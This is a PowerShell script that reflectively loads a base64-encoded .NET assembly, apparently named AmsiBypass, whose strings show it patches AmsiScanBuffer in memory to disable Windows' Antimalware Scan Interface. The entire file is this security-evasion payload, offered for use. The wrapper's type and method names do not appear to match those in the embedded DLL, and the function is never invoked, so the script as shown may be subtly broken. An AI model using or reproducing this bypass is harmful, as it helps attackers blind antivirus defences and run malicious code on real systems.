# AMSI Buffer Patch - In memory
try {
     function Bypass-AMSI
{
    if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {     [Reflection.Assembly]::Load([Convert]::FromBase64String("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YXJkAERpc2FibGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5SW5mb3JtYXRpb25hbFZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAGR3U2l6ZQBzaXplAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAQWxsb2NIR2xvYmFsAE1hcnNoYWwAS2VybmVsMzIuZGxsAEFtc2lCeXBhc3MuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBvcF9BZGRpdGlvbgBaZXJvAC5jdG9yAFVJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAFJ1bnRpbWVIZWxwZXJzAEFtc2lCeXBhc3MAR2V0UHJvY0FkZHJlc3MAbHBBZGRyZXNzAE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAZGVzdABJbml0aWFsaXplQXJyYXkAQ29weQBMb2FkTGlicmFyeQBSdGxNb3ZlTWVtb3J5AG9wX0VxdWFsaXR5AAARYQBtAHMAaQAuAGQAbABsAABXRQBSAFIATwBSADoAIABDAG8AdQBsAGQAIABuAG8AdAAgAHIAZQB0AHIAaQBlAHYAZQAgAGEAbQBzAGkALgBkAGwAbAAgAHAAbwBpAG4AdABlAHIALgAAHUEAbQBzAGkAUwBjAGEAbgBCAHUAZgBmAGUAcgAAc0UAUgBSAE8AUgA6ACAAQwBvAHUAbABkACAAbgBvAHQAIAByAGUAdAByAGkAZQB2AGUAIABBAG0AcwBpAFMAYwBhAG4AQgB1AGYAZgBlAHIAIABmAHUAbgBjAHQAaQBvAG4AIABwAG8AaQBuAHQAZQByAAB1RQBSAFIATwBSADoAIABDAG8AdQBsAGQAIABuAG8AdAAgAGMAaABhAG4AZwBlACAAQQBtAHMAaQBTAGMAYQBuAEIAdQBmAGYAZQByACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMAIQAAU0cAcgBlAGEAdAAgAHMAdQBjAGMAZQBzAHMALgAgAEEAbQBzAGkAUwBjAGEAbgBCAHUAZgBmAGUAcgAgAHAAYQB0AGMAaABlAGQAIQAgADoAKQAAALj1zdc1kW1DrpRSfqgqDIUABCABAQgDIAABBSABARERBCABAQ4NBwoYGBkJHQUYAggCAgIGGAUAAgIYGAQAAQEOBAABGQsHAAIBElERVQQAARgICAAEAR0FCBgIBQACGBgICMx7E//NLd1RAwYREAUAAhgYDgQAARgOCAAEAhgZCRAJBgADARgYCAMAAAgIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEABwEAAAAANgEAGS5ORVRTdGFuZGFyZCxWZXJzaW9uPXYyLjABAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lAA8BAApBbXNpQnlwYXNzAAAKAQAFRGVidWcAAAwBAAcxLjAuMC4wAAAKAQAFMS4wLjAAAAQBAAAAAAAAAAAAOsRk5QABTVACAAAAZAAAAHwrAAB8DQAAAAAAAAAAAAABAAAAEwAAACcAAADgKwAA4A0AAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RTjA86n5+khUmILRfMmrpC/wEAAAAvb3B0L1Byb2plY3RzL0Ftc2lCeXBhc3MvQW1zaUJ5cGFzcy9vYmovRGVidWcvbmV0c3RhbmRhcmQyLjAvQW1zaUJ5cGFzcy5wZGIAU0hBMjU2AIwPOp+fpIWJyC0XzJq6Qv86xGTlbSfIKidw8ohPKRL4LywAAAAAAAAAAAAASSwAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAADssAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAAD/JQAgABAx/5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAADUAgAAAAAAAAAAAADUAjQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAENAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAEAIAAAEAMAAwADAAMAAwADQAYgAwAAAANgALAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAABBAG0AcwBpAEIAeQBwAGEAcwBzAAAAAAA+AAsAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAQQBtAHMAaQBCAHkAcABhAHMAcwAAAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAPgAPAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABBAG0AcwBpAEIAeQBwAGEAcwBzAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABGAA8AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQQBtAHMAaQBCAHkAcABhAHMAcwAuAGQAbABsAAAAAAA2AAsAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEEAbQBzAGkAQgB5AHAAYQBzAHMAAAAAADAABgABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAFw8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==")) | Out-Null
        Write-Output "DLL has been reflected";
    }
    [Bypass.AMSI]::Patch()
}
    Write-Host "Script executed successfully"
} catch {
    Write-Host "Script execution failed: $($_.Exception.Message)"
}

